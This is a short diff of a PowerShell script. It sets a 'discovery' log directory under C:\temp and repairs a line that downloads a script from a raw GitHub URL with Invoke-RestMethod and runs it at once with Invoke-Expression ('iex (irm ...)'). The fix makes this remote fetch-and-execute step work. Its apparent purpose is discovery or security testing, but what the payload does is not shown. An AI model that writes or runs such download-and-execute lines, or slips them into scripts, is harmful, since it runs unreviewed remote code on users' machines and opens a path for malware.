@@ -1,7 +1,7 @@
 $LogDir = "C:\temp\templogs"
 $LogFile = Join-Path $LogDir "discovery.txt"
 
-iex (irm -Uri (https://raw.githubusercontent.com/testingindustriallogic/securityscanning/main/level4)
+iex (irm -Uri ('https://raw.githubusercontent.com/testingindustriallogic/securityscanning/main/level4'))
 
 New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
 
